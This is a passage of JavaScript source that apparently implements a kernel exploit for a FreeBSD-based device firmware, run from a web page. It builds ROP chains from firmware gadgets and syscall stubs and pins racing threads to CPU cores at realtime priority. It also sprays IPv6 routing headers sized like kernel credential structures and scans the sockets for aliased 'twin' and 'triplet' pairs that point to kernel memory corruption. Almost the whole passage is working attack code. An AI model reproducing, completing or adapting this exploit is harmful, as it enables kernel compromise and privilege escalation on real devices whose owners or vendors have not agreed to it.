      out.prioSeen = pb.type + "/" + pb.prio;
      driver.pinned = false;
    } catch (err) {
      out.error = (err && err.message) || String(err);
    }
    flushMark(
      "DRIVER-RESTORE",
      why +
        "-aff=" +
        out.affOk +
        "-prio=" +
        out.prioOk +
        (out.error ? "-ERR-" + out.error.slice(0, 60) : ""),
    );
    return out;
  }

  const SPAWN_POISON = 0xdeadbeef;

  async function spawnGroup(g) {
    for (const t of g.threads) queueSpawn(t, g.S, "spawnret", t.jbWid);
    for (const t of g.threads) g.S.set("spawnret", t.jbWid, SPAWN_POISON);
    flushMark(
      "SPAWN-PRE",
      g.name +
        "-n=" +
        g.threads.length +
        "-thr_new=0x1C7-param_size=0x68-param=0x" +
        g.threads[0].thr_new_args.toString() +
        "-entry=lc+longjmp-poison=0x" +
        SPAWN_POISON.toString(16),
    );
    const t0 = Date.now();
    let runErr = null;
    try {
      await runChain();
    } catch (err) {
      runErr = err;
      flushMark(
        "SPAWN-ROUNDTRIP-FAILED",
        g.name +
          "-" +
          String((err && err.message) || err).slice(0, 60) +
          "-reading-spawnret-anyway",
      );
    }
    const ms = Date.now() - t0;
    const raw = g.threads.map((t) => g.S.get("spawnret", t.jbWid) >>> 0);
    const rets = g.threads.map((t) => g.S.s32("spawnret", t.jbWid));

    if (state.groups && state.groups.indexOf(g) < 0) state.groups.push(g);
    g.spawned = [];
    const notRun = [],
      failedIdx = [];
    for (let i = 0; i < g.threads.length; ++i) {
      const t = g.threads[i];
      t.jbSpawnRet = rets[i];
      if (raw[i] === SPAWN_POISON) {
        t.jbSpawned = false;
        notRun.push(i);
      } else if (rets[i] !== 0) {
        t.jbSpawned = false;
        failedIdx.push(i);
      } else {
        t.jbSpawned = true;
        state.threadsCreated++;
        g.spawned.push(t);
      }
    }

    g.wids = g.spawned.map((t) => t.jbWid);
    flushMark(
      "SPAWN",
      g.name +
        "-rets=" +
        rets.join(".") +
        "-live=" +
        g.spawned.length +
        "-notrun=" +
        notRun.length +
        "-ms=" +
        ms,
    );
    for (const t of g.spawned) readTid(t);

    if (runErr) throw runErr;
    if (notRun.length === g.threads.length)
      throw new Error(
        "spawn chain '" +
          g.name +
          "' never ran: all " +
          "spawnret slots still hold poison 0x" +
          SPAWN_POISON.toString(16),
      );
    if (failedIdx.length) {
      const b = failedIdx[0];
      throw new Error(
        "thr_new failed for " +
          g.threads[b].jbName +
          ": ret=" +
          rets[b] +
          " (" +
          failedIdx.length +
          " of " +
          g.threads.length +
          " failed, " +
          g.spawned.length +
          " live, registered for teardown)",
      );
    }
    if (notRun.length)
      throw new Error(
        notRun.length +
          " of " +
          g.threads.length +
          " spawnret slots in '" +
          g.name +
          "' still poisoned: " +
          g.spawned.length +
          " thread(s) live, registered for teardown",
      );
    return { rets, ms };
  }

  function prologueProblem(t, S, wid, core, prio) {
    const pinret = S.s32("pinret", wid);
    const affret = S.s32("affret", wid);
    const prioret = S.s32("prioret", wid);
    const lookupret = S.s32("lookupret", wid);
    const cpu = S.get("cpu", wid) & 0xffff;
    const who = t.jbName || "racer" + wid;
    if (pinret !== 0)
      return (
        who + ": cpuset_setaffinity returned " + pinret + " inside the thread"
      );
    if (affret !== 0)
      return who + ": cpuset_getaffinity read-back returned " + affret;
    if (cpu !== core) return who + ": on core " + cpu + ", not " + core;
    const back = r32(t.jbBufs.maskBack.u8, 0);
    if (back !== (1 << core) >>> 0)
      return (
        who +
        ": mask read back 0x" +
        back.toString(16) +
        ", expected 0x" +
        ((1 << core) >>> 0).toString(16)
      );
    if (prioret !== 0)
      return (
        who +
        ": rtprio_thread(RTP_SET) returned " +
        prioret +
        ", not at PRI_REALTIME/" +
        prio +
        ", still timesharing"
      );
    if (lookupret !== 0)
      return who + ": rtprio_thread(RTP_LOOKUP) returned " + lookupret;
    const bt = r16(t.jbBufs.rtpBack.u8, 0);
    const bp = r16(t.jbBufs.rtpBack.u8, 2);
    if (bt !== TK.PRI_REALTIME || bp !== prio)
      return (
        who +
        ": RTP_LOOKUP read back type=" +
        bt +
        " prio=" +
        bp +
        ", expected " +
        TK.PRI_REALTIME +
        "/" +
        prio
      );
    return "";
  }

  function groupPrologueProblem(g, core, prio) {
    for (const t of g.spawned) {
      const p = prologueProblem(t, g.S, t.jbWid, core, prio);
      if (p) return p;
    }
    return "";
  }

  async function awaitStatus(S, wid, want, ms, why) {
    const t0 = Date.now();
    for (;;) {
      if (S.get("status", wid) === want) return Date.now() - t0;
      if (Date.now() - t0 > ms) {
        flushMark(
          "STATUS-TIMEOUT",
          why +
            "-wid=" +
            wid +
            "-saw=" +
            S.get("status", wid) +
            "-want=" +
            want,
        );
        return -1;
      }
      await sleep(1);
    }
  }

  return {
    M1,
    needStub,
    needGadget,
    needGadgets,
    newSync,
    newThread,
    queueSpawn,
    readTid,
    emitPrologue,
    emitRacerLoop,
    buildRacer,
    assertSlots,
    maxSlots,
    newGroup,
    signal,
    waitFinished,
    waitStatus,
    terminate,

    newWakeGates,
    wakeArgs,
    armSignal,
    closeWakeGates,
    setSignalMarksQuiet,
    slotLo,
    slotHi,
    slotAddr,
    retargetSlot,
    setSlotU32,
    readAffinity,
    writeAffinityBytes,
    pinDriver,
    readRtprio,
    writeRtprio,
    thrSelf,
    driverCurrentCpu,
    chainCall,
    restoreDriver,

    spawnGroup,
    prologueProblem,
    groupPrologueProblem,
    awaitStatus,
    SPAWN_POISON,
    G_STORE,
    G_CALL,
    G_COPY,
    G_BRANCH,
  };
}

export const TWK = {
  IPV6_SOCK_NUM: 80,

  UCRED_SIZE: K.UCRED_SIZE,

  RTHDR_TAG: K.RTHDR_TAG,

  LEAK_LEN_IN: 8,

  C_ATTEMPTS: 5000,

  MAX_ROUNDS_TWIN: 10,

  MAX_ROUNDS_TRIPLET: 500,

  FIND_TRIPLET_FAST: 5000,

  REPAIR_SLEEP_MS: 10,

  REPAIR_ATTEMPTS: 12,

  REPAIR_ROUNDS_PER_TRY: 64,

  PROGRESS_EVERY: 1000,

  CHAIN_EPILOGUE_SLOTS: 64,
};

export function rthdrShape(size) {
  const len = ((size >> 3) - 1) & ~1;
  return { len, segleft: len >> 1, optlen: (len + 1) << 3, type: 0 };
}

export function makeTwinEngine(X) {
  const {
    P,
    chain,
    i64,
    sys,
    runChain,
    flushMark,
    queueEvent,
    note,
    track,
    untrack,
    state,
  } = X;

  let scanMarksQuiet = false;

  function setScanMarksQuiet(quiet) {
    const was = scanMarksQuiet;
    scanMarksQuiet = !!quiet;
    return was;
  }
  function scanMark(tag, extra) {
    if (scanMarksQuiet) queueEvent(tag, extra);
    else flushMark(tag, extra);
  }

  const N_DEFAULT = TWK.IPV6_SOCK_NUM;
  const SHAPE = rthdrShape(TWK.UCRED_SIZE);

  const SYS_SETSOCKOPT = 0x069;
  const SYS_GETSOCKOPT = 0x076;
  const SYS_SOCKET = 0x061;
  const SYS_CLOSE = 0x006;
  const SYS_SCHED_YIELD = 0x14b;
  const SYS_NANOSLEEP = 0x0f0;

  function needStub(num, why) {
    if (P.syscalls[num] === undefined)
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile: " +
          why +
          ".",
      );
    return P.syscalls[num];
  }
  function needGadget(name, why) {
    const g = P.gadgets[name];
    if (g === undefined)
      throw new Error(
        "gadget '" + name + "' missing from the active firmware map: " + why,
      );
    return g;
  }

  function arena(nbytes, label) {
    const raw = P.malloc(nbytes, 1);
    const base = i64(raw.low, raw.hi);
    const u8 = raw.backing;
    for (let k = 0; k < nbytes; ++k) u8[k] = 0;
    state.heapBytes += 1000 + nbytes;

    flushMark(
      "ARENA",
      label +
        "-base=0x" +
        base.toString() +
        "-bytes=" +
        nbytes +
        "-end=0x" +
        base.add32(nbytes).toString(),
    );
    return { base, u8, bytes: nbytes, label };
  }

  const S = {
    fds: [],
    n: 0,
    spray: null,
    pad: null,
    padBatch: 0,
    sprayLen: 0,
    twins: [-1, -1],
    triplets: [-1, -1, -1],
    attemptsRun: 0,
    chainRuns: 0,

    sprayCalls: 0,

    emittedCalls: 0,
    firstSprayDone: false,

    corrupt: "",

    burned: [],

    dupCount: 0,
  };

  function poison(reason) {
    if (S.corrupt) return S.corrupt;
    S.corrupt = String(reason)
      .replace(/[\r\n\t]+/g, " ")
      .slice(0, 400);
    flushMark("ENGINE-POISONED", S.corrupt.slice(0, 150));
    return S.corrupt;
  }

  function burn(idx, why) {
    if (S.burned.indexOf(idx) >= 0) return false;
    S.burned.push(idx);
    flushMark(
      "BANK-BURNED",
      "idx=" +
        idx +
        "-fd=" +
        S.fds[idx] +
        "-burned=" +
        S.burned.length +
        "-of-" +
        S.n +
        "-why=" +
        String(why).slice(0, 120),
    );
    return true;
  }
  const isBurned = (idx) => S.burned.indexOf(idx) >= 0;

  function clearCorrupt(why) {
    if (!S.corrupt) return "";
    const was = S.corrupt;
    S.corrupt = "";
    flushMark(
      "ENGINE-UNPOISONED",
      String(why).slice(0, 200) + " -- was: " + was.slice(0, 120),
    );
    return was;
  }

  const canonicalTag = (i) => (TWK.RTHDR_TAG | i) >>> 0;

  function isForged(i) {
    return !!S.spray && i >= 0 && i < S.n && sprayTagOf(i) !== canonicalTag(i);
  }

  function bankForgeries() {
    const out = [];
    if (!S.spray) return out;
    for (let i = 0; i < S.n; ++i)
      if (sprayTagOf(i) !== canonicalTag(i))
        out.push(i + "=>" + (sprayTagOf(i) & 0xffff));
    return out;
  }

  function buildSprayBank(n) {
    const stride = TWK.UCRED_SIZE;
    const a = arena(n * stride, "spray-bank-" + n + "x" + stride);
    let len = 0;
    for (let i = 0; i < n; ++i) {
      const off = i * stride;
      len = buildRthdr(a.u8, off, TWK.UCRED_SIZE);
      w32(a.u8, off + 0x04, (TWK.RTHDR_TAG | i) >>> 0);
    }
    S.spray = a;
    S.sprayLen = len;
    return { arena: a, stride, len, shape: SHAPE };
  }

  function setSprayTag(i, tagIndex) {
    w32(
      S.spray.u8,
      i * TWK.UCRED_SIZE + 0x04,
      (TWK.RTHDR_TAG | tagIndex) >>> 0,
    );
  }
  function sprayPtr(i) {
    return S.spray.base.add32(i * TWK.UCRED_SIZE);
  }
  function sprayTagOf(i) {
    return r32(S.spray.u8, i * TWK.UCRED_SIZE + 0x04) >>> 0;
  }

  const PAD_SENTINEL = 0xee;

  function allocPad(batch, n) {
    const cells = batch * n;
    const off = {
      retSet: 0,
      retGet: cells * 4,
      optlen: cells * 8,
      leak: cells * 12,
    };
    const total = cells * 12 + cells * 8;
    const a = arena(total, "pad-" + batch + "x" + n);
    S.pad = { a, off, cells, batch, n };
    S.padBatch = batch;
    return S.pad;
  }

  const padIdx = (a, i) => a * S.pad.n + i;
  const optlenPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.optlen + padIdx(a, i) * 4);
  const leakPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.leak + padIdx(a, i) * 8);
  const retSetPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.retSet + padIdx(a, i) * 4);
  const retGetPtr = (a, i) =>
    S.pad.a.base.add32(S.pad.off.retGet + padIdx(a, i) * 4);

  const retSetOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.retSet + padIdx(a, i) * 4) | 0;
  const retGetOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.retGet + padIdx(a, i) * 4) | 0;
  const optlenOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.optlen + padIdx(a, i) * 4) >>> 0;
  const leakTagOf = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.leak + padIdx(a, i) * 8 + 4) >>> 0;
  const leakWord0Of = (a, i) =>
    r32(S.pad.a.u8, S.pad.off.leak + padIdx(a, i) * 8) >>> 0;

  function armPad(batch, n) {
    const u8 = S.pad.a.u8,
      o = S.pad.off;
    for (let a = 0; a < batch; ++a) {
      for (let i = 0; i < n; ++i) {
        const k = a * S.pad.n + i;
        w32(u8, o.optlen + k * 4, TWK.LEAK_LEN_IN);

        for (let b = 0; b < 8; ++b) u8[o.leak + k * 8 + b] = PAD_SENTINEL;
        w32(u8, o.retSet + k * 4, 0x7fffffff);
        w32(u8, o.retGet + k * 4, 0x7fffffff);
      }
    }
  }

  function chainCapacity() {
    const usable = (chain.stack_size - chain.reserved_stack) / 8;
    return Math.floor(usable) - TWK.CHAIN_EPILOGUE_SLOTS;
  }

  function measureShape(n) {
    if (!S.spray) throw new Error("measureShape: spray bank not built");
    armPadIfNeeded(1, n);
    const before = chain.count;
    emitAttempt(0, n, { readbackOnly: false, sharedOptlen: false });
    const perAttempt = chain.count - before;
    chain.clear();
    const cap = chainCapacity();
    const m = {
      perAttempt,
      perCall: perAttempt / (2 * n),
      capacity: cap,
      stackSize: chain.stack_size,
      reserved: chain.reserved_stack,
      maxBatch: Math.max(1, Math.floor(cap / perAttempt)),
      afterClear: chain.count,
      calls: 2 * n,
    };
    S.lastShape = m;
    return m;
  }

  function emitCall(num, retPtr, a1, a2, a3, a4, a5) {
    if (Object.prototype.hasOwnProperty.call(BANNED, num))
      throw new Error(
        "emitCall: syscall 0x" +
          num.toString(16).toUpperCase() +
          " is banned: " +
          BANNED[num],
      );
    const stub = P.syscalls[num];
    if (stub === undefined)
      throw new Error(
        "emitCall: syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile",
      );
    chain.fcall(stub, a1, a2, a3, a4, a5);
    chain.write_result4(retPtr);
    S.emittedCalls++;
  }

  function emitAttempt(a, n, opts) {
    const readbackOnly = !!(opts && opts.readbackOnly);
    const sharedOptlen = !!(opts && opts.sharedOptlen);
    const skip = (opts && opts.skip) || null;
    const readOnly = opts && opts.readOnly;

    if (!readbackOnly) {
      for (let i = 0; i < n; ++i) {
        if (skip && skip.indexOf(i) >= 0) continue;

        if (S.burned.length && isBurned(i)) continue;
        emitCall(
          SYS_SETSOCKOPT,
          retSetPtr(a, i),
          S.fds[i],
          K.IPPROTO_IPV6,
          K.IPV6_RTHDR,
          sprayPtr(i),
          S.sprayLen,
        );
      }
    }
    if (readOnly !== undefined && readOnly !== null) {
      const i = readOnly;
      emitCall(
        SYS_GETSOCKOPT,
        retGetPtr(a, i),
        S.fds[i],
        K.IPPROTO_IPV6,
        K.IPV6_RTHDR,
        leakPtr(a, i),
        sharedOptlen ? optlenPtr(a, 0) : optlenPtr(a, i),
      );
      return;
    }
    for (let i = 0; i < n; ++i) {
      emitCall(
        SYS_GETSOCKOPT,
        retGetPtr(a, i),
        S.fds[i],
        K.IPPROTO_IPV6,
        K.IPV6_RTHDR,
        leakPtr(a, i),

        sharedOptlen ? optlenPtr(a, 0) : optlenPtr(a, i),
      );
    }
  }

  function isTwin(i, j, val, n) {
    return (
      (val & 0xffff0000) >>> 0 === TWK.RTHDR_TAG && i !== j && j >= 0 && j < n
    );
  }

  function scanBatch(batch, n, attemptBase) {
    const census = {
      spraysFailed: [],
      readsFailed: [],
      optlenWrong: [],
      untouched: [],
      tagAbsent: [],
      outOfRange: [],
      selfTagged: 0,
      examined: 0,
      sprayFailCount: 0,
      readFailCount: 0,
      untouchedCount: 0,
      tagAbsentCount: 0,
      optlenWrongCount: 0,
      outOfRangeCount: 0,
    };
    let hit = null;
    for (let a = 0; a < batch; ++a) {
      for (let i = 0; i < n; ++i) {
        const rs = retSetOf(a, i);
        if (rs !== 0) {
          census.sprayFailCount++;
          if (census.spraysFailed.length < 12)
            census.spraysFailed.push(
              "a" + (attemptBase + a) + ".s" + i + "=" + rs,
            );
        }
      }
      for (let i = 0; i < n; ++i) {
        census.examined++;
        const rg = retGetOf(a, i);
        if (rg !== 0) {
          census.readFailCount++;
          if (census.readsFailed.length < 12)
            census.readsFailed.push(
              "a" + (attemptBase + a) + ".s" + i + "=" + rg,
            );
          continue;
        }
        const ol = optlenOf(a, i);
        if (ol !== TWK.LEAK_LEN_IN) {
          census.optlenWrongCount++;
          if (census.optlenWrong.length < 12)
            census.optlenWrong.push(
              "a" + (attemptBase + a) + ".s" + i + "=" + ol,
            );
        }
        const w0 = leakWord0Of(a, i);
        const val = leakTagOf(a, i);
        if (w0 === 0xeeeeeeee && val === 0xeeeeeeee) {
          census.untouchedCount++;
          if (census.untouched.length < 12)
            census.untouched.push("a" + (attemptBase + a) + ".s" + i);
          continue;
        }
        if ((val & 0xffff0000) >>> 0 !== TWK.RTHDR_TAG) {
          census.tagAbsentCount++;
          if (census.tagAbsent.length < 12)
            census.tagAbsent.push(
              "a" + (attemptBase + a) + ".s" + i + "=0x" + val.toString(16),
            );
          continue;
        }
        const j = val & 0xffff;
        if (j === i) {
          census.selfTagged++;
          continue;
        }

        if (j < 0 || j >= n) {
          census.outOfRangeCount++;
          if (census.outOfRange.length < 12)
            census.outOfRange.push(
              "a" + (attemptBase + a) + ".s" + i + "=j" + j,
            );
          continue;
        }
        if (hit === null) {
          if (!isTwin(i, j, val, n))
            throw new Error(
              "scanBatch: guards admitted " +
                "(i=" +
                i +
                ", j=" +
                j +
                ", val=0x" +
                val.toString(16) +
                ") but isTwin() rejects it",
            );
          hit = {
            i,
            j,
            val,
            attempt: attemptBase + a,
            localAttempt: a,

            jGreaterThanI: j > i,

            forged: isForged(i),
          };
        }
      }
      if (hit !== null) break;
    }
    return { hit, census };
  }

  function newTotals() {
    return {
      spraysFailed: [],
      readsFailed: [],
      optlenWrong: [],
      untouched: [],
      tagAbsent: [],
      outOfRange: [],
      selfTagged: 0,
      examined: 0,
      sprayFailCount: 0,
      readFailCount: 0,
      untouchedCount: 0,
      tagAbsentCount: 0,
      optlenWrongCount: 0,
      outOfRangeCount: 0,
      batches: 0,

      firstSprayFailAt: -1,
      firstReadFailAt: -1,
    };
  }
  const EXEMPLAR_CAP = 12;
  function mergeExemplars(dst, src) {
    for (const v of src) {
      if (dst.length >= EXEMPLAR_CAP) break;
      dst.push(v);
    }
  }
  function accumulate(total, c, attemptBase) {
    total.batches++;
    total.selfTagged += c.selfTagged;
    total.examined += c.examined;
    total.sprayFailCount += c.sprayFailCount;
    total.readFailCount += c.readFailCount;
    total.untouchedCount += c.untouchedCount;
    total.tagAbsentCount += c.tagAbsentCount;
    total.optlenWrongCount += c.optlenWrongCount;
    total.outOfRangeCount += c.outOfRangeCount;
    mergeExemplars(total.spraysFailed, c.spraysFailed);
    mergeExemplars(total.readsFailed, c.readsFailed);
    mergeExemplars(total.optlenWrong, c.optlenWrong);
    mergeExemplars(total.untouched, c.untouched);
    mergeExemplars(total.tagAbsent, c.tagAbsent);
    mergeExemplars(total.outOfRange, c.outOfRange);
    if (c.sprayFailCount && total.firstSprayFailAt < 0) {
      total.firstSprayFailAt = attemptBase;

      flushMark(
        "TWIN-SPRAY-DEGRADED",
        "firstBadAttempt=" +
          attemptBase +
          "-failedInBatch=" +
          c.sprayFailCount +
          "-sample=" +
          (c.spraysFailed[0] || "?"),
      );
    }
    if (c.readFailCount && total.firstReadFailAt < 0)
      total.firstReadFailAt = attemptBase;
    return total;
  }

  async function runTwinBatch(batch, n, attemptBase, opts) {
    if (chain.count !== chain.initial_count + 3)
      throw new Error(
        "chain not fresh (count=" +
          chain.count +
          ", expected " +
          (chain.initial_count + 3) +
          ")",
      );

    const cap = chainCapacity();

    armPadIfNeeded(batch, n);
    let slots = 0;
    try {
      for (let a = 0; a < batch; ++a) {
        if (S.lastShape && chain.count + S.lastShape.perAttempt > cap)
          throw new Error(
            "chain would overflow the " +
              "usable stack at attempt " +
              a +
              " of " +
              batch +
              " (slot " +
              chain.count +
              " + " +
              S.lastShape.perAttempt +
              " > cap " +
              cap +
              ")",
          );
        emitAttempt(a, n, opts);
        if (chain.count > cap)
          throw new Error(
            "chain overflowed the usable " +
              "stack at attempt " +
              a +
              " of " +
              batch +
              " (slot " +
              chain.count +
              " > cap " +
              cap +
              ")",
          );
      }
      slots = chain.count;
    } catch (err) {
      chain.clear();
      throw err;
    }
    const t0 = Date.now();
    await runChain();
    const ms = Date.now() - t0;
    S.chainRuns++;
    S.attemptsRun += batch;
    S.sprayCalls += batch * n;
    return { slots, ms, scan: scanBatch(batch, n, attemptBase) };
  }

  async function findTwins(cfg) {
    const o = cfg || {};
    const n = S.n;
    const attempts = o.attempts || TWK.C_ATTEMPTS;
    const deadlineMs = o.deadlineMs || 0;
    let batch = o.batch || 1;
    if (batch > 1 && !o.allowBatch)
      throw new Error(
        "find_twins refuses batch=" +
          batch +
          " without an explicit allowBatch reason",
      );
    const cap = chainCapacity();
    const perAttempt = S.lastShape ? S.lastShape.perAttempt : 0;
    if (perAttempt && batch * perAttempt > cap)
      throw new Error(
        "batch " +
          batch +
          " x " +
          perAttempt +
          " slots exceeds the usable chain region (" +
          cap +
          ")",
      );

    const t0 = Date.now();
    let done = 0,
      worstMs = 0,
      totalMs = 0;
    const first = { spraySample: null, getSample: null, optlenSample: null };
    let lastCensus = null;
    const total = newTotals();
    let nextProgress = TWK.PROGRESS_EVERY;

    while (done < attempts) {
      if (deadlineMs && Date.now() - t0 > deadlineMs) {
        flushMark(
          "TWIN-DEADLINE",
          "attempts=" +
            done +
            "-of-" +
            attempts +
            "-ms=" +
            (Date.now() - t0) +
            "-totSprayFail=" +
            total.sprayFailCount +
            "-totReadFail=" +
            total.readFailCount +
            "-totSelf=" +
            total.selfTagged +
            "of" +
            total.examined,
        );
        return {
          found: false,
          reason: "deadline",
          attempts: done,
          ms: Date.now() - t0,
          worstMs,
          census: lastCensus,
          total,
          first,
        };
      }
      const b = Math.min(batch, attempts - done);
      const r = await runTwinBatch(b, n, done, o.emit || null);
      totalMs += r.ms;
      if (r.ms > worstMs) worstMs = r.ms;
      lastCensus = r.scan.census;
      accumulate(total, r.scan.census, done);

      if (!S.firstSprayDone) {
        S.firstSprayDone = true;
        first.spraySample = retSetOf(0, 0);
        first.getSample = retGetOf(0, 0);
        first.optlenSample = optlenOf(0, 0);

        scanMark(
          "TWIN-FIRST-CALLS",
          "set_rthdr[0]=" +
            first.spraySample +
            "-get_rthdr[0]=" +
            first.getSample +
            "-optlen[0]=" +
            first.optlenSample +
            "-tag[0]=0x" +
            leakTagOf(0, 0).toString(16) +
            "-sprayLen=" +
            S.sprayLen,
        );
      }

      if (r.scan.hit) {
        const h = r.scan.hit;
        S.twins[0] = h.i;
        S.twins[1] = h.j;

        if (!h.forged)
          poison(
            "sockets " +
              h.i +
              " and " +
              h.j +
              " alias in " +
              "kernel (val=0x" +
              h.val.toString(16) +
              " at attempt " +
              h.attempt +
              "), canonical spray bank",
          );
        flushMark(
          "TWIN-FOUND",
          "attempt=" +
            h.attempt +
            "-i=" +
            h.i +
            "-fdI=" +
            S.fds[h.i] +
            "-j=" +
            h.j +
            "-fdJ=" +
            S.fds[h.j] +
            "-val=0x" +
            h.val.toString(16) +
            "-jGTi=" +
            h.jGreaterThanI +
            "-forgedByThisPage=" +
            h.forged +
            "-localAttempt=" +
            h.localAttempt +
            "-ofBatch=" +
            b +
            "-ms=" +
            (Date.now() - t0),
        );

        return {
          found: true,
          i: h.i,
          j: h.j,
          val: h.val,
          hit: h,
          batch: b,
          attempts: h.attempt + 1,
          ms: Date.now() - t0,
          worstMs,
          census: r.scan.census,
          total,
          first,
        };
      }

      done += b;

      queueEvent(
        "TWIN-ATTEMPT",
        "n=" +
          done +
          "-ms=" +
          r.ms +
          "-slots=" +
          r.slots +
          "-self=" +
          r.scan.census.selfTagged +
          "-untouched=" +
          r.scan.census.untouchedCount,
      );
      if (o.onProgress) o.onProgress(done, attempts, Date.now() - t0);

      if (done >= nextProgress) {
        nextProgress = done + TWK.PROGRESS_EVERY;
        flushMark(
          "TWIN-PROGRESS",
          "attempts=" +
            done +
            "-of-" +
            attempts +
            "-ms=" +
            (Date.now() - t0) +
            "-perAttemptMs=" +
            (totalMs / Math.max(1, done)).toFixed(2) +
            "-totSprayFail=" +
            total.sprayFailCount +
            "-totReadFail=" +
            total.readFailCount +
            "-totSelf=" +
            total.selfTagged +
            "of" +
            total.examined +
            "-firstSprayFailAt=" +
            total.firstSprayFailAt,
        );
      }
    }

    scanMark(
      "TWIN-GIVEUP",
      "attempts=" +
        done +
        "-ms=" +
        (Date.now() - t0) +
        "-totSprayFail=" +
        total.sprayFailCount +
        "-totReadFail=" +
        total.readFailCount +
        "-totSelf=" +
        total.selfTagged +
        "of" +
        total.examined,
    );
    return {
      found: false,
      reason: "budget",
      attempts: done,
      ms: Date.now() - t0,
      worstMs,
      census: lastCensus,
      total,
      first,
    };
  }

  async function findTriplet(master, other, cfg) {
    const o = cfg || {};
    const n = S.n;

    const attempts = o.attempts || TWK.MAX_ROUNDS_TRIPLET;

    const deadlineMs = o.deadlineMs || 0;
    const deadlineAt =
      o.deadlineAt || (deadlineMs ? Date.now() + deadlineMs : 0);
    if (master < 0 || master >= n)
      throw new Error("find_triplet: master " + master + " is out of range");
    const skip = other >= 0 && other < n ? [master, other] : [master];
    const t0 = Date.now();
    let done = 0,
      lastVal = 0,
      lastRet = 0,
      lastOptlen = 0;
    let nextProgress = TWK.PROGRESS_EVERY;

    while (done < attempts) {
      if (deadlineAt && Date.now() > deadlineAt) {
        flushMark(
          "TRIPLET-DEADLINE",
          "master=" +
            master +
            "-other=" +
            other +
            "-attempts=" +
            done +
            "-lastRet=" +
            lastRet +
            "-lastVal=0x" +
            lastVal.toString(16),
        );
        return {
          j: -1,
          reason: "deadline",
          why: whyNoTriplet(master, other, n, lastRet, lastVal),
          attempts: done,
          ms: Date.now() - t0,
          lastVal,
          lastRet,
          lastOptlen,
        };
      }
      if (chain.count !== chain.initial_count + 3)
        throw new Error(
          "find_triplet: chain is not fresh (count=" + chain.count + ")",
        );
      armPadIfNeeded(1, n);
      try {
        emitAttempt(0, n, { skip, readOnly: master });
        if (chain.count > chainCapacity())
          throw new Error(
            "find_triplet: chain overflow at slot " + chain.count,
          );
      } catch (err) {
        chain.clear();
        throw err;
      }
      await runChain();
      S.chainRuns++;
      done++;

      lastRet = retGetOf(0, master);
      lastOptlen = optlenOf(0, master);
      lastVal = leakTagOf(0, master);
      const j = lastVal & 0xffff;

      if (
        lastRet === 0 &&
        (lastVal & 0xffff0000) >>> 0 === TWK.RTHDR_TAG &&
        j !== master &&
        j !== other &&
        j >= 0 &&
        j < n
      ) {
        const forged = isForged(master);

        if (!forged)
          poison(
            "socket " +
              master +
              " reads back socket " +
              j +
              "'s tag (val=0x" +
              lastVal.toString(16) +
              "), " +
              "canonical spray bank: master and " +
              j +
              " share one rthdr",
          );
        flushMark(
          "TRIPLET-FOUND",
          "master=" +
            master +
            "-other=" +
            other +
            "-j=" +
            j +
            "-fd=" +
            S.fds[j] +
            "-val=0x" +
            lastVal.toString(16) +
            "-attempts=" +
            done +
            "-forgedByThisPage=" +
            forged,
        );
        return {
          j,
          forged,
          attempts: done,
          ms: Date.now() - t0,
          lastVal,
          lastRet,
          lastOptlen,
        };
      }
      if (done % 100 === 0)
        queueEvent(
          "TRIPLET-ATTEMPT",
          "master=" +
            master +
            "-n=" +
            done +
            "-val=0x" +
            lastVal.toString(16) +
            "-word0=0x" +
            leakWord0Of(0, master).toString(16) +
            "-optlen=" +
            lastOptlen,
        );

      if (done >= nextProgress) {
        nextProgress = done + TWK.PROGRESS_EVERY;
        flushMark(
          "TRIPLET-PROGRESS",
          "master=" +
            master +
            "-attempts=" +
            done +
            "-of-" +
            attempts +
            "-ms=" +
            (Date.now() - t0) +
            "-lastRet=" +
            lastRet +
            "-lastVal=0x" +
            lastVal.toString(16),
        );
      }
    }
    flushMark(
      "TRIPLET-GIVEUP",
      "master=" +
        master +
        "-other=" +
        other +
        "-attempts=" +
        done +
        "-lastRet=" +
        lastRet +
        "-lastVal=0x" +
        lastVal.toString(16) +
        "-word0=0x" +
        leakWord0Of(0, master).toString(16) +
        "-optlen=" +
        lastOptlen,
    );
    return {
      j: -1,
      reason: "budget",
      why: whyNoTriplet(master, other, n, lastRet, lastVal),
      attempts: done,
      ms: Date.now() - t0,
      lastVal,
      lastRet,
      lastOptlen,
    };
  }

  function whyNoTriplet(master, other, n, lastRet, lastVal) {
    if (lastRet !== 0) return "read-failed";
    if (lastVal === 0xeeeeeeee) return "master-untouched";
    if ((lastVal & 0xffff0000) >>> 0 !== TWK.RTHDR_TAG) return "tag-absent";
    const j = lastVal & 0xffff;
    if (j === master) return "excluded-self";
    if (j === other) return "excluded-other";
    if (j < 0 || j >= n) return "out-of-range";
    return "unknown";
  }

  function tripletsValid() {
    const t = S.triplets,
      n = S.n;
    return (
      t[0] >= 0 &&
      t[1] >= 0 &&
      t[2] >= 0 &&
      t[0] < n &&
      t[1] < n &&
      t[2] < n &&
      t[0] !== t[1] &&
      t[0] !== t[2] &&
      t[1] !== t[2]
    );
  }

  async function repairTriplets(cfg) {
    const o = cfg || {};
    const n = S.n;
    const log = [];

    const attempts = o.attempts || TWK.REPAIR_ROUNDS_PER_TRY;
    const tries = o.tries || TWK.REPAIR_ATTEMPTS;

    const deadlineAt =
      o.deadlineAt || (o.deadlineMs ? Date.now() + o.deadlineMs : 0);
    const budget = { attempts, deadlineAt };
    let last = null;

    for (const slot of [1, 2]) {
      const t = S.triplets;
      if (t[slot] >= 0 && t[slot] < n) continue;
      const other = t[slot === 1 ? 2 : 1];
      let got = -1;
      for (let k = 0; k < tries; ++k) {
        flushMark(
          "TRIPLET-REPAIR",
          "slot=" +
            slot +
            "-try=" +
            (k + 1) +
            "-of-" +
            tries +
            "-master=" +
            t[0] +
            "-other=" +
            other,
        );
        const r = await findTriplet(t[0], other, budget);
        last = r;
        if (r.j >= 0) {
          got = r.j;
          log.push(
            "slot" +
              slot +
              " found " +
              got +
              " on try " +
              (k + 1) +
              " after " +
              r.attempts +
              " attempts",
          );
          break;
        }
        log.push(
          "slot" +
            slot +
            " try " +
            (k + 1) +
            " failed (" +
            (r.reason || "?") +
